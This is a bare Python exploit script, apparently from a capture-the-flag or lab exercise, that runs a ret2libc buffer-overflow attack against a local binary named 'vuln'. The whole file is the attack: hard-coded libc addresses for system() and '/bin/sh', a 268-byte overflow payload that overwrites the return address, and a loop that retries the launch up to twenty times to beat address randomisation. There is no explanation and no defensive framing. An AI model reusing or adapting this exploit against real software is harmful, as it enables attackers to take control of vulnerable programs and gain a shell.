#!/usr/bin/python
from pwn import *
from subprocess import call
libc_base = 0xf75be000
system_off = 0x040310
binsh_off  = 0x16084c

system = libc_base + system_off
binsh  = libc_base + binsh_off

#log.success("system = " + hex(system))
#log.success("binsh  = " + hex(binsh))

payload = "A" * 268 + p32(system) + p32(0xdeadbeef) + p32(binsh)
i = 20
while (i>0):
    p = call(['./vuln', payload])
    #print p
    i -= 1
    if not (p):
        break
    else:
        print "failed error (" + str(p) + ")"
